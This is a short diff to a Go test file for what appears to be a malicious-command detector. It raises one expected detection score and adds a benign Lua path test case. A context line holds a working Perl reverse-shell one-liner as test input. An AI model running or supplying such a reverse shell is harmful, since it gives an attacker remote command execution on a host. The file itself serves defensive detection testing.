@@ -100,7 +100,7 @@ func TestMalware(t *testing.T) {
 			args: args{command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:9999\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
 			want: MalReporter{
 				Types: Confusion,
-				Score: 0.94,
+				Score: 0.99,
 				Plain: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socke",
 			},
 		},
@@ -111,6 +111,15 @@ func TestMalware(t *testing.T) {
 				Types: Unknown,
 				Score: 0.0,
 				Plain: "SPq$b6^vuY8Bo2dM",
+			},
+		},
+		{
+			name: "Normal $PATH environment",
+			args: args{command: "/usr/local/share/luajit-2.1.0-beta3/?.lua;/usr/local/share/lua/5.1/?.lua;/usr/local/lib/lua/?.lua;;"},
+			want: MalReporter{
+				Types: Unknown,
+				Score: 0.0,
+				Plain: "",
 			},
 		},
 	}
